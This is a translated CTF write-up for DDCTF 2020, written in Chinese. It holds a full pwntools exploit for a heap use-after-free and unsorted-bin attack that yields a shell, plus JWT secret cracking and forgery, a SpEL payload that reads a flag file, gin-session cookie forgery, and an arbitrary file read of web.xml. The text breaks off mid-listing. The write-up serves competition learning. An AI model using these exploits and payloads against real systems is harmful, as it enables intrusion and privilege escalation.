# DDCTF 2020 Writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## we_love_free
vector结构：
    00000000 vector          struc ; (sizeof=0x18, mappedto_7)
    00000000                                         ; XREF: .bss:vec_/r
    00000000 start           dq ?
    00000008 cur             dq ?
    00000010 end             dq ?
    00000018 vector          ends
    00000018
    00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-NUMPAD+ TO EXPAND]
    00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Dyn. PRESS CTRL-NUMPAD+ TO EXPAND]
vector
的扩容规则是1,2,4,8,16,32,依次乘2个元素的时候会先申请新的空间，在把原来的数据拷贝到新申请的空间中，在释放原先的空间，对应申请的堆块大小（加上头部）0x20,0x20,0x30,0x50,0x90…..
漏洞点：
思路为：
  * 先`add`16个元素（0x90的堆块），这样调用`show`函数的时候，在`push 0xAABBCCDD`之后，原先的堆块就会被释放，这样就能有`UAF`的效果，先泄露下libc的地址，在调用`clear`函数清空，这里调用`clear`会触发`malloc_consolidate`，所以堆又会变成原来的样子
  * 在`add`至少`0x20`个元素，每个元素都为`one_gadget`，在堆上残留数据，在调用`clear`函数清空堆
  * 接着在`add`16个元素，调用`show`函数
  * `show`函数还会问我们要不要修改元素的值，所以我们可以把`unsorted bin`的`bk`指针改掉，用作`unsortedbin attack`，改成啥后面再说
  * 接着在修改`push 0xAABBCCDD`之后新申请的堆块的大小，改小`size`，在`clear`的时候不触发`malloc_consolidate`，这样就为后面的`unsortedbin attack`做好了准备
  * 最后只要在`add` 9 个元素，vector就会申请0x80大小的堆块，触发`unsortedbin attack`，将`unsortedbin`的地址写入一个地方
现在的问题就是将这个`unsortedbin`的地址写哪里了，我们可以看到程序用到了cin，cout，在data段上有指针指向他们虚表：
所以我们选择攻击cin或者cout，都试一下，效果如下：
libc2.23有很多`one_gadget`，这里选的是：
  * 在add完元素之后就会调用cin，或者cout，就能触发one_gadget，拿到shell
**exp**
    from pwn import *
    context.arch = 'amd64'
    # context.terminal = ["tmux","split-window","-h"]
    def cmd(command):
        p.recvuntil(">>")
        p.sendline(str(command))
    def add(cap):
        cmd(1)
        p.recvuntil("num:")
        p.sendline(str(cap))
    def show():
        cmd(2)
    def clear():
        cmd(3)
    def main(host,port=5005):
        global p
        if host:
            p = remote(host,port)
        else:
            p = process("./pwn1")
            gdb.attach(p)
            # gdb.attach(p,"b *0x000000000401192")
        for i in range(0x10):
            add(0xcafebabedeadbeef)
        show()
        p.recvuntil("1:")
        libc.address = int(p.recvuntil('\n')[:-1]) - 0x3c4b78
        info("libc : " + hex(libc.address))
        for i in range(34):
            p.recvuntil("(y/n):")
            p.send('n')
        for i in range(0x10):
            add(libc.address)
        clear()
        for i in range(0x21):
            add(0xf67b0+libc.address)
        clear()
        # unsorted bin attack
        for i in range(0x10):
            add(0xcafebabedeadbeef)
        show()
        p.recvuntil("1:")
        p.recvuntil("(y/n):")
        p.send('n')
        p.recvuntil("(y/n):")
        p.send('y')
        # modify unsortedbin->bk
        p.sendline(str(0x6051f8-0x10))
        for i in range(32):
            p.recvuntil("(y/n):")
            p.send('y')
            p.sendline(str(0x71))
        clear()
        # trigger one_gadget
        for i in range(0x9):
            add(0xcafebabedeadbeef)
        p.interactive()
    if __name__ == "__main__":
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
        main(args['REMOTE'])
## Web签到题
**题目描述**
    请从服务端获取client，利用client获取flag
    server url:http://117.51.136.197/hint/1.txt
打开
[http://117.51.136.197/hint/1.txt。](http://117.51.136.197/hint/1.txt%E3%80%82)
随便登录一下，返回的是 jwt。
再去 auth 验证，显示不是 admin。
 解码：
    {
      "userName": "1",
      "pwd": "2",
      "userRole": "GUEST",
      "exp": 1599455908
    }
尝试爆破：
    ➜  c-jwt-cracker git:(master) ✗ ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIyIiwidXNlclJvbGUiOiJHVUVTVCIsImV4cCI6MTU5OTQ1NTkwOH0.pmPAENHIrzdgFmXFH51YUYLci_7eMNFBVPHKjd0o4RQ
    Secret is "2"
伪造 JWT：
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIyIiwidXNlclJvbGUiOiJBRE1JTiIsImV4cCI6MTU5OTQ1NTkwOH0.TUEJsckrY__hRRoKBv30-cXvDZwrTZq916CjC708L-4
 下载下来。
Go 写的，简单逆一下，得到签名算法。
    package main
    import (
        "bytes"
        "io/ioutil"
        "net/http"
        "crypto/hmac"
        "crypto/sha256"
        "encoding/base64"
        "encoding/json"
        "time"
        "github.com/gin-gonic/gin"
    )
    type Param struct {
        Command   string `json:"command"`
        Signature string `json:"signature"`
        Timestamp int64  `json:"timestamp"`
    }
    func main() {
        r := gin.Default()
        r.POST("/", func(c *gin.Context) {
            command := c.DefaultPostForm("command", "DDCTF")
            key := "DDCTFWithYou"
            timestamp := time.Now().Unix()
            plain := fmt.Sprintf("%s|%d", command, timestamp)
            mac := hmac.New(sha256.New, []byte(key))
            mac.Write([]byte(plain))
            param := new(Param)
            param.Command = command
            param.Signature = base64.StdEncoding.EncodeToString(mac.Sum(nil))
            param.Timestamp = timestamp
            js, _ := json.Marshal(param)
            url := "http://117.51.136.197/server/command"
            resp, err := http.Post(url, "application/json", bytes.NewBuffer(js))
            if err != nil {
                panic(err)
            }
            defer resp.Body.Close()
            body, _ := ioutil.ReadAll(resp.Body)
            c.String(http.StatusOK, string(body))
        })
        r.Run(":2333")
    }
一开始还以为是 cel，SpEL 有点简单过滤，直接能读到 /flag。
    new java.util.Scanner(new java.io.File('/home/dc2-user/flag/flag.txt')).next()
## 卡片商店
**题目描述**
    题目链接：
    http://116.85.37.131/0714dcd10ba8571bc7887aeaa4adaa0e/
网站逻辑比较简单，总共有几个点：
  * 向朋友借钱 /loans?loans=999
  * 借钱给朋友 /sends?sends=999
  * 刷新卡片 /banlance
  * 兑换礼物 /gift
  * 重新开始 /reset
直接点兑换礼物，会显示：卡片数量不够 / 有借卡记录。
试几次发现借钱这有溢出，大概在 `2 ** 63 - 2` 左右。
领礼物！
尝试过程中，发现 cookie 一直在变的，看起来比较像 gin-session。
    MTU5OTM3MTgyOXxEdi1CQkFFQ180SUFBUkFCRUFBQV80dl9nZ0FDQm5OMGNtbHVad3dJQUFaM1lXeHNaWFFHYzNSeWFXNW5ERlFBVW5zaWIzZHBibWR6SWpwYlhTd2lhVzUyWlhOMGN5STZXMTBzSW0xdmJtVjVJam93TENKdWIzZGZkR2x0WlNJNk1UVTVPVE0zTVRneU9Td2ljM1JoY25SZmRHbHRaU0k2TVRVNU9UTTNNVGd5T1gwR2MzUnlhVzVuREFjQUJXRmtiV2x1QkdKdmIyd0NBZ0FBfO4vhpl7H2aOCvA6U6z8hL6S8JQp85w1Gc4MrGAvjS8S
并且，解码几次后发现有数据：
弄个 Demo 验证一下：
    package main
    import (
        "github.com/gin-contrib/sessions"
        "github.com/gin-contrib/sessions/cookie"
        "github.com/gin-gonic/gin"
    )
    func main() {
        r := gin.Default()
        store := cookie.NewStore([]byte("secret"))
        r.Use(sessions.Sessions("session", store))
        r.GET("/hello", func(c *gin.Context) {
            session := sessions.Default(c)
            if session.Get("hello") != "world" {
                session.Set("hello", "world")
                session.Save()
            }
            c.JSON(200, gin.H{"hello": session.Get("hello")})
        })
        r.Run(":8000")
    }
没毛病，那么礼物里给的 SecKey: Udc13VD5adM_c10nPxFu[@v12](https://github.com/v12 "@v12")
应该就是密钥了。
直接访问
[http://116.85.37.131/0714dcd10ba8571bc7887aeaa4adaa0e/flag，显示是不是幸运玩家。](http://116.85.37.131/0714dcd10ba8571bc7887aeaa4adaa0e/flag%EF%BC%8C%E6%98%BE%E7%A4%BA%E6%98%AF%E4%B8%8D%E6%98%AF%E5%B9%B8%E8%BF%90%E7%8E%A9%E5%AE%B6%E3%80%82)
结合上面 base64 解码的来看，里面还有个 admin 的 bool 值，尝试伪造 cookie。拿上面的 Demo 改改：
    func main() {
        r := gin.Default()
        store := cookie.NewStore([]byte("Udc13VD5adM_c10nPxFu@v12"))
        r.Use(sessions.Sessions("session", store))
        r.GET("/hello", func(c *gin.Context) {
            session := sessions.Default(c)
            if session.Get("admin") != true {
                session.Set("admin", true)
                session.Save()
            }
            c.JSON(200, gin.H{"admin": session.Get("admin")})
        })
        r.Run(":8000")
    }
    MTU5OTM3MjczMnxEdi1CQkFFQ180SUFBUkFCRUFBQUhmLUNBQUVHYzNSeWFXNW5EQWNBQldGa2JXbHVCR0p2YjJ3Q0FnQUJ8C_Mv8jlvNUHLHLCjWl4ADTbzs6s06pkZx1zQEC5xlRo=
直接就出 flag 了 ：）
另外，这 cookie 里的 session 大致格式可能是
`base64encode(timestamp|base64urlencode(gob)|xxx)`，可结合源码进行验证。
使用  可以把中间部分逆出来：
    map[interface{}]interface{}{"wallet": "{"owings":[],"invests":[],"money":0,"now_time":1599371829,"start_time":1599371829}","admin": false}
## Easy Web
**题目描述**
    题目链接：
    http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/index
访问题目直接 302
到登录页面：
登录时看到 rememberMe，大概率是打 Shiro，CVE 直接绕。
任意读：http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=static/hello.jpg
http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/web.xml
      Archetype Created Web Application
        contextConfigLocation
        classpath:spring-core.xml
        org.springframework.web.util.WebAppRootListener
        org.springframework.web.util.IntrospectorCleanupListener
        org.springframework.web.context.ContextLoaderListener
        springmvc
        org.springframework.web.servlet.DispatcherServlet
          contextConfigLocation
          classpath:spring-web.xml
        springmvc
        /
        encodingFilter
        org.springframework.web.filter.CharacterEncodingFilter
          encoding
          UTF-8
          forceEncoding
          true
        encodingFilter
        /*
        safeFilter
        com.ctf.util.SafeFilter
        safeFilter
        /*
        shiroFilter